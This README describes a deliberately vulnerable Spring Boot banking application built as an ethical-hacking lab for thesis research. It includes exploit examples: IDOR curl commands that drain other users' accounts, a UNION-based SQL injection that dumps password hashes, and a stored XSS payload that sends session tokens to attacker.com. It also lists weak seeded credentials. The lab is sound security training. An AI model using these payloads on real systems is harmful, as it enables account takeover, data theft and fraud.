# BancoCentral-SecLand-Vulnerable - Ethical Hacking Lab

This repository contains the source code for **"Banco Central de SecLand"**, a deliberately vulnerable web banking application built with Spring Boot (Java) and PostgreSQL. The main goal of this project is to serve as a **laboratory for ethical hacking research and practice**, as well as to develop an anomaly detection module based on Artificial Intelligence (AI), as part of a Master's Thesis (TFM).

> **Warning:** This application is deliberately vulnerable and is intended **for educational and research purposes only**. **Do not use in production or with real data.**

## Table of Contents
1. [Project Objective](#project-objective)
2. [Implemented Features](#implemented-features)
3. [Vulnerabilities and Security Practices](#vulnerabilities-and-security-practices)
4. [Technologies Used](#technologies-used)
5. [How to Get Started](#how-to-get-started)
6. [API Endpoints](#api-endpoints)
7. [Sample Data](#sample-data)
8. [License](#license)

## Project Objective

This project aims to provide a controlled environment to:
* Conduct penetration testing (pentesting) on common banking functionalities using **Kali Linux**.
* Study and exploit security vulnerabilities intentionally introduced in both code and business logic.
* Collect detailed logs for the training and validation of an AI-based anomaly detection model.
* Serve as an original research platform for a Master's Thesis, ensuring no public "solutions" exist for its vulnerabilities.

## Implemented Features

* **User Management:** Customer registration (with input validation) and authentication.
* **Account Management:** Viewing of Savings and Checking accounts.
* **Transactions:** Funds transfer between accounts and transaction history.
* **Transaction Search:** Search transactions by description keyword (SQL Injection demo).
* **RESTful API:** All functionality is exposed through a REST API.
* **Mixed Security:** Combines robust security practices with deliberately introduced vulnerabilities.

## Vulnerabilities and Security Practices

This application is designed with a mixed security posture for educational purposes.

### Intentional Vulnerabilities

#### A05:2021 - Broken Access Control (IDOR) - Transfer Endpoint

**Endpoint:** `POST /api/accounts/transfer`

The transfer endpoint does **not** verify that the authenticated user owns the `sourceAccountId`.
An attacker who knows another user's account ID can transfer funds from that account.

**Exploit example:**
```bash
# Authenticated as testuser, drain carolina_p's account (ID 301) into your own
curl -X POST http://localhost:8080/api/accounts/transfer \
  -H "Authorization: Bearer simulated.jwt.token.for.testuser" \
  -H "Content-Type: application/json" \
  -d '{"sourceAccountId": 301, "destinationAccountId": 101, "amount": 5000, "description": "IDOR exploit"}'
```

#### A05:2021 - Broken Access Control (IDOR) - Transaction History Endpoint

**Endpoint:** `GET /api/accounts/{accountId}/transactions`

Any authenticated user can retrieve the full transaction history of any account by guessing
or enumerating account IDs. There is no ownership check.

**Exploit example:**
```bash
# Authenticated as testuser, read carolina_p's transaction history (account ID 301)
curl http://localhost:8080/api/accounts/301/transactions \
  -H "Authorization: Bearer simulated.jwt.token.for.testuser"
```

#### A03:2021 - SQL Injection - Transaction Search Endpoint

**Endpoint:** `GET /api/accounts/search?description=...`

The `description` query parameter is concatenated directly into a raw SQL query without
parameterization. An attacker can append SQL to extract arbitrary data from the database.

**Exploit example:**
```bash
# Extract all usernames and hashed passwords from the users table
curl "http://localhost:8080/api/accounts/search?description=x%25'%20UNION%20SELECT%20id,username,password,NULL,NULL,NULL%20FROM%20users--" \
  -H "Authorization: Bearer simulated.jwt.token.for.testuser"
```

#### A03:2021 - Stored Cross-Site Scripting (XSS) - Transaction Description

**Endpoints:** `POST /api/accounts/transfer` (store) and `GET /api/accounts/{accountId}/transactions` (retrieve)

Transaction descriptions are stored and returned without sanitization. A malicious script
stored in a description will execute in any user's browser that views the transaction history.

**Exploit example (payload in description field):**
```
<img src=x onerror="fetch('http://attacker.com?t='+sessionStorage.getItem('authToken'))">
```
When any user views the transaction history, this script exfiltrates their session token.

#### Business Logic Flaw - No Sufficient Funds Check

**Endpoint:** `POST /api/accounts/transfer`

The transfer logic does **not** verify that the source account has enough funds, allowing
accounts to reach a negative balance (unlimited overdraft).

**Exploit example:**
```bash
curl -X POST http://localhost:8080/api/accounts/transfer \
  -H "Authorization: Bearer simulated.jwt.token.for.testuser" \
  -H "Content-Type: application/json" \
  -d '{"sourceAccountId": 101, "destinationAccountId": 201, "amount": 999999, "description": "overdraft"}'
```

---

### Secure Practices Implemented (Counterexamples)

* **A02:2021 - Cryptographic Failures:** Passwords are **never stored in plain text**. All passwords are hashed using **BCrypt (strength 10)** before being saved to the database.

* **Secure Account Listing:** `GET /api/accounts` uses the authenticated user's server-side identity (not a client-supplied parameter) to return only that user's accounts, preventing IDOR on account enumeration.

* **Input Validation:** The registration endpoint enforces strict validation via Jakarta Bean Validation (`@Valid`): username must be 3-20 alphanumeric characters; password must be 8-100 characters and include at least one uppercase letter, one lowercase letter, and one digit.

* **Authentication Required:** All endpoints except `/api/auth/**` require a valid authenticated session.

* **BigDecimal for Money:** Financial amounts use `BigDecimal` to avoid floating-point rounding errors.

## Technologies Used

* **Backend:** Java 21, Spring Boot 3, Spring Security, Spring Data JPA, MapStruct
* **Database:** PostgreSQL 15
* **Build Tool:** Maven
* **Containerization:** Docker, Docker Compose
* **Frontend:** HTML5, CSS3, Vanilla JavaScript, Nginx
* **Testing:** JUnit 5, Postman
* **Attack Platform:** Kali Linux

## How to Get Started

The project is fully containerized for easy and fast deployment.

1.  **Prerequisites:**
    * [Docker Desktop](https://www.docker.com/products/docker-desktop) installed and running.
    * A Git client.

2.  **Clone and Run:**
    ```bash
    # Clone this repository
    git clone https://github.com/careb36/BancoCentral-SecLand-Vulnerable.git

    # Enter the project directory
    cd BancoCentral-SecLand-Vulnerable

    # Launch the application and database using Docker Compose
    docker-compose up --build
    ```
    The **frontend** is available at `http://localhost:80`  
    The **backend API** is available at `http://localhost:8080`

## API Endpoints

### Authentication (`/api/auth`)

* **Register a new user**
    * **Endpoint:** `POST /api/auth/register`
    * **Body:**
        ```json
        {
            "username": "new_user",
            "password": "MyNewPass1",
            "fullName": "Full Name"
        }
        ```
    * **Note:** This creates a **new** user. Password must contain at least one uppercase letter, one lowercase letter, and one digit (minimum 8 characters). Pre-seeded test users (e.g., `testuser/password123`) were inserted directly into the database and bypass registration validation.

* **Log in**
    * **Endpoint:** `POST /api/auth/login`
    * **Body:**
        ```json
        {
            "username": "testuser",
            "password": "password123"
        }
        ```

### Accounts (`/api/accounts`)

* **List authenticated user's accounts** *(secure - ownership verified)*
    * **Endpoint:** `GET /api/accounts`
    * **Auth:** Required (Bearer token)

* **Make a transfer** *(IDOR + Business Logic Flaw)*
    * **Endpoint:** `POST /api/accounts/transfer`
    * **Body:**
        ```json
        {
            "sourceAccountId": 101,
            "destinationAccountId": 201,
            "amount": 500.00,
            "description": "Test transfer"
        }
        ```

* **Get transaction history** *(IDOR + Stored XSS)*
    * **Endpoint:** `GET /api/accounts/{accountId}/transactions`
    * **Auth:** Required (Bearer token)

* **Search transactions by description** *(SQL Injection + IDOR)*
    * **Endpoint:** `GET /api/accounts/search?description=<keyword>`
    * **Auth:** Required (Bearer token)

## Sample Data

The database is initialized with the following users and accounts for testing:

| Entity  | ID  | Details                                                           |
| :------ | :-: | :---------------------------------------------------------------- |
| User    | 1   | `username`: **testuser**, `password`: **password123**             |
| User    | 2   | `username`: **admin**, `password`: **admin123**                   |
| User    | 3   | `username`: **carolina_p**, `password`: **password123**           |
| User    | 4   | `username`: **test_user**, `password`: **testpass**               |
| Account | 101 | Type: Checking, Balance: $2,500.00, Owner: `testuser`             |
| Account | 102 | Type: Savings,  Balance: $1,750.25, Owner: `testuser`             |
| Account | 201 | Type: Checking, Balance: $10,000.00, Owner: `admin`               |
| Account | 202 | Type: Savings,  Balance: $25,000.50, Owner: `admin`               |
| Account | 301 | Type: Savings,  Balance: $5,000.75, Owner: `carolina_p`           |
| Account | 302 | Type: Checking, Balance: $1,250.00, Owner: `carolina_p`           |
| Account | 401 | Type: Savings,  Balance: $800.50, Owner: `test_user`              |

## License

This project is licensed under the MIT License. See the [LICENSE](https://github.com/careb36/careb36-BancoCentral-SecLand-Vulnerable/blob/main/LICENCE) file for more details.

---

> **Warning!** This application is deliberately vulnerable and is designed solely for educational purposes. Do **not** use it in production or with real data.
